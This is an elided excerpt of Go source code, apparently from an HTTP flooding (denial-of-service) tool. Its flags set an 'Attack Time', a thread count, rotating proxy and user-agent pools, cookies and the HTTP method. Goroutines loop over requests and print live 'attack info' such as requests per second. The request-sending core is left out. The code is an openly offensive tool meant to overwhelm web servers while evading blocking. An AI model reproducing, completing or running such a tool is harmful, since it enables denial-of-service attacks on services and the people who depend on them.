...
var version = "2.4.0 (Releases 2024/05/29 9:15 AM)"
...
func main() {
	...
	userAgentFile := flag.String("ua_pool", "", "User-Agent Pool Path (txt)")
	proxyListFile := flag.String("ip_pool", "", "IP Pool Path (txt)")
	threadCount := flag.Int("thread", 2, "thread")
	httpVersion := flag.Float64("http_version", 1.1, "HTTP version (1.1 or 2.0)")
	attackTime := flag.Int("time", 0, "Attack Time (seconds)")
	cookie := flag.String("cookie", "", "Cookie to include in request")
	method := flag.String("http_methods", "GET", "HTTP Request Method (GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH, TRACE, CONNECT)")
	...
	if !validMethods[strings.ToUpper(*method)] {
		fmt.Println("\033[31mInvalid HTTP method. Please use GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH, TRACE, or CONNECT.\033[0m")
		return
	}
	...
	for i := 0; i < *threadCount; i++ {
		...
		go func() {
			...
			for {
				...
				// Print attack info
				fmt.Printf("\r\033[31mRequested:%d \033[0m|\033[31m %.1f p/s \033[0m|\033[31m URL:%s \033[0m|\033[31m Thread:%d \033[0m|\033[31m Speed:%d\033[31m ms \033[0m|\033[31m Timeout:%d\033[31m ms \033[0m|\033[31m Error:%d \033[0m", successCount, requestsPerSecond, reqURL, *threadCount, *requestInterval, *timeout, errorCount)
